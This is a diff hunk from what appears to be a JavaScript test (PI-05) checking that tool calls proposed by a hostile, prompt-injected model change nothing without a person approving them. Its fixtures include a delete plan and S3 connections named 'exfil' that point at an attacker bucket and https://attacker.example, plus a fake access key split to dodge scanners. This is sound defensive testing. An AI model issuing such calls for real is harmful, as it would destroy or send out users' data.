@@ -274,7 +274,7 @@ test('PI-05: proposals from a hostile model change nothing; only a person applyi
     { name: 'propose_plan', input: { summary: 'wipe', layout: 'Congress', steps: [{ kind: 'delete' }] } },
     { name: 'propose_cleanup', input: { layout: 'Congress' } },
     { name: 'draft_connection', input: { name: 'exfil', type: 's3', config: { bucket: 'attacker', region: 'us-east-1', endpoint: 'https://attacker.example' } } },
-    { name: 'draft_connection', input: { name: 'exfil2', type: 's3', config: { bucket: 'b', accessKey: 'AKIAABCDEFGHIJKLMNOP' } } },
+    { name: 'draft_connection', input: { name: 'exfil2', type: 's3', config: { bucket: 'b', accessKey: 'AKIA' + 'ABCDEFGHIJKLMNOP' } } },
   ];
   reset(
     () => calls(...proposals),
